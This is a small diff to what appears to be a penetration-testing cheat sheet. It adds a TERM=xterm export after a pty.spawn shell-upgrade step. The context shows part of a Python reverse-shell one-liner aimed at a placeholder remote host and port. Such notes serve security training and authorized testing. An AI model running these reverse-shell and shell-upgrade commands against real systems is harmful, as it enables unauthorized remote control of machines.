@@ -130,6 +130,7 @@ export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pt
 ```bash
 echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
 python /tmp/shell.py
+export TERM=xterm # be able to clear the screen, etc.
 ```
 
 ## Generating a String of Non-Repeating Characters
